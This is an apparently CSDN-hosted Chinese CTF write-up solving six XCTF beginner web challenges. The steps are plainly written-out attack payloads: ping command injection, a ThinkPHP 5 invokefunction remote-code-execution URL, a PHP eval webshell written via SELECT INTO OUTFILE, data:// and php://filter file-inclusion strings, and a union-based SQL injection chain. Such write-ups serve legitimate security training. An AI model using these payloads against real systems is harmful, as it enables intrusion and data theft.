# 原创
：  【攻防世界WEB】难度二星6分入门题（上）：webshell、command_execution、xff_referer、php_rce、Web_php_include、NewsCenter

# 【攻防世界WEB】难度二星6分入门题（上）：webshell、command_execution、xff_referer、php_rce、Web_php_include、NewsCenter

**目录**

[一、webshell](#%E4%B8%80%E3%80%81webshell)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[二、command_execution](#%E4%BA%8C%E3%80%81command_execution)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[三、xff_referer](#%E4%B8%89%E3%80%81xff_referer)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

[四、php_rce](#%E5%9B%9B%E3%80%81php_rce)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程：](#%E8%BF%87%E7%A8%8B%EF%BC%9A)

[五、Web_php_include](#%E4%BA%94%E3%80%81Web_php_include)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程1：](#%E8%BF%87%E7%A8%8B1%EF%BC%9A)

[过程2：](#%E8%BF%87%E7%A8%8B2%EF%BC%9Adata%3A%2F%2F)

[六、NewsCenter](#%E5%85%AD%E3%80%81NewsCenter)

[解题方法：](#%E8%A7%A3%E9%A2%98%E6%96%B9%E6%B3%95%EF%BC%9A)

[过程](#%E8%BF%87%E7%A8%8B)

---


## 一、webshell

> 

 

<h3>解题方法：</h3>
1、使用蚁剑（菜刀、冰蝎）进行连接


> 
<h3> 知识点：</h3>
[中国蚁剑使用，及修改蚁剑特征<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://blog.csdn.net/qq_53079406/article/details/123302775?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165840515916782184690711%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165840515916782184690711&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-123302775-null-null.185^v2^control&amp;utm_term=%E8%9A%81%E5%89%91&amp;spm=1018.2226.3001.4450](https://blog.csdn.net/qq_53079406/article/details/123302775?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165840515916782184690711%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=165840515916782184690711&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-123302775-null-null.185%5Ev2%5Econtrol&amp;utm_term=%E8%9A%81%E5%89%91&amp;spm=1018.2226.3001.4450)


> 
<h3>过程</h3>
知道URL，知道密码


<hr/>
连接<br/><img alt="" height="866" src="https://img-blog.csdnimg.cn/612ca31227464788be699f50d81be309.png" width="1200"/>
双击进去URL看见flag了

 <img alt="" height="866" src="https://img-blog.csdnimg.cn/c5c53414746741bc80f8a29d3088a6b0.png" width="1200"/>
 



---


---


## 二、command_execution

> 

 

<h3>解题方法：</h3>
1、ping夹带系统命令执行


> 
<h3>过程</h3>
可能存在命令执行漏洞，在ping之后夹带了系统命令
127.0.0.1;ls /
（ping自己主机，并查看目录）

 
 
<hr/>
使用find（全局查找）函数查找flag，并获得其路径
/home/flag.txt

<hr/>
获取文件内容
127.0.0.1;cat /home/flag.txt

 


---


---


---


## 三、xff_referer

> 

 

<h3>解题方法：</h3>
1、伪造ip和网站来源


> 
<h3>过程</h3>
bp拦截请求

添加X-Forwarded-For
123.123.123.123
然后放包

提示：必须来自https://www.google.com

<hr/>
添加referer
[https://www.google.com](https://www.google.com)
再放包

 
<hr/>

 



---


---


---


## 四、php_rce

> 

 

<h3>解题方法：</h3>
1、查看robots.txt文件


> 

<h3>过程：</h3>
寻找ThinkPHP V5利用工具

<hr/>
利用已知漏洞，如
index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=后面接命令
……
<hr/>
 
利用漏洞寻找工具
环境python2.7

 <img alt="" height="927" src="https://img-blog.csdnimg.cn/258d4be913e647a597e2df04ab6e88cd.png" width="1200"/>




<hr/>

查看目录（可以往根目录一直查）
http://61.147.171.105:53830/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls
<img alt="" height="877" src="https://img-blog.csdnimg.cn/b28933ccbe444458829da0641d250fa6.png" width="1200"/>​
<hr/>
http://61.147.171.105:53830/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls%20../../../
<img alt="" height="866" src="https://img-blog.csdnimg.cn/af2b0ad405f840c08439c20630870dff.png" width="1200"/>​
 
<hr/>
 可以直接全局查找
http://61.147.171.105:53830/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find%20/%20-name%20%22flag%22
<img alt="" height="856" src="https://img-blog.csdnimg.cn/db9c920f0c2d4084879ff596a3bd478a.png" width="1200"/>​
 
<hr/>
查看内容
http://61.147.171.105:53830/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag
<img alt="" height="878" src="https://img-blog.csdnimg.cn/21277d62fe8e490baabaa2e036a61a2e.png" width="1200"/>​
 


---


---


---


---


---


## 五、Web_php_include

> 
<img alt="" height="294" src="https://img-blog.csdnimg.cn/c7eab9e3f94f40f9b012a8dc97956f4e.png" width="1108"/>​
 

<h3>解题方法：</h3>
1、写入一句话木马，后连接
2、使用php伪协议


> 
<h3>过程1：</h3>
扫描到后台
<img alt="" height="682" src="https://img-blog.csdnimg.cn/4a328f0aad6f41b2a6462d818c6dd932.png" width="927"/>​
 
不需要尝试爆破，因为密码为空
<img alt="" height="630" src="https://img-blog.csdnimg.cn/d13f843e03b049588c6ed24aa718a1ce.png" width="1200"/>​
<hr/>
查询参数secure-file-priv
show variables like "secure_file_priv";
secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的<img alt="" height="662" src="https://img-blog.csdnimg.cn/5adb25925e0a45288bfa4b9e8ff6e757.png" width="1200"/>​
 就可以上传一句话木马上去了
select "&lt;?php eval($_POST['1']); ?&gt;"into outfile '/tmp/1.php'
<img alt="" height="668" src="https://img-blog.csdnimg.cn/737ea13ecbdb4d73a5be04e88600b27c.png" width="1200"/>​
<hr/>
 连接到一句话木马<img alt="" height="866" src="https://img-blog.csdnimg.cn/929cc7c412b44a83947832c23d92cd01.png" width="1200"/>​<img alt="" height="866" src="https://img-blog.csdnimg.cn/6d77b35a252848cda686a590ee348a80.png" width="1200"/>​
 <img alt="" height="475" src="https://img-blog.csdnimg.cn/36c6db8e13414fe1a3d6d1df96372931.png" width="1200"/>​
 


---


> 
<h3>过程2：</h3>
data://用来执行PHP代码
?page=data://text/plain,&lt;?php system("ls")?&gt;
也可将要执行的命令进行base64加密
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4=<br/><img alt="" height="875" src="https://img-blog.csdnimg.cn/3e89c00530ed484387f0f717cb1b011b.png" width="1200"/>​
<hr/>
php://filter用于读取源码
http://61.147.171.105:51359?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php<br/><img alt="" height="891" src="https://img-blog.csdnimg.cn/1157047fe5944fc9900cea9cedf968c9.png" width="1200"/>​
 对其进行解码
<img alt="" height="525" src="https://img-blog.csdnimg.cn/9f182d03235e455eb4e17f54ef40433c.png" width="845"/>​



---


---


## 六、NewsCenter

> 
<img alt="" height="290" src="https://img-blog.csdnimg.cn/54ee43b4a696486f910fd43da76c7cb9.png" width="1103"/>​
 

<h3>解题方法：</h3>
1、SQL注入


> 
<h3>过程</h3>
有输入框，可能是存在注入点了
<img alt="" height="885" src="https://img-blog.csdnimg.cn/aef993ad937d4181bc0a51c54b31ea02.png" width="1200"/>​
<hr/>
 可以使用acunetix等工具对URL进行漏扫
可以看到SQL盲注
<img alt="" height="567" src="https://img-blog.csdnimg.cn/33b076518fcc426ebe42dbeacb4462ba.png" width="697"/>​
 
<hr/>
接下来可以手工，也可以用sqlmap跑
可以判断出字段数位3；且回显位为2，3
1' union select 1,2,3#
1' union select 1,2,3,4#(报错)
<img alt="" height="867" src="https://img-blog.csdnimg.cn/a9876c38e7134d4eadbc72cb110c2f7f.png" width="1200"/>​
爆库
1' union select 1,database(),user()#<img alt="" height="832" src="https://img-blog.csdnimg.cn/189012e9731c42d19ada6b3fa499d2a0.png" width="1200"/>​
 爆表
1' union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=database() #
<img alt="" height="858" src="https://img-blog.csdnimg.cn/313a7b60acd94e60b0b5e35f001ed09f.png" width="1200"/>​
 依次排查每个表中的字段
1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='secret_table' #
<img alt="" height="858" src="https://img-blog.csdnimg.cn/d43c5003fa15488e95782f62b918d041.png" width="1200"/>​
 爆数据
1' union select 1,2,(select group_concat(id,0x3a,fl4g) from secret_table) #
<img alt="" height="858" src="https://img-blog.csdnimg.cn/94e19226d742436f8baa1ff0a4dce721.png" width="1200"/>​
<hr/>
 或者使用sqlmap（我感觉跑起来挺慢的，还没手工快）
<img alt="" height="482" src="https://img-blog.csdnimg.cn/29a0b2628fce49e89f57ad29d7dddc5e.png" width="1200"/>​



---

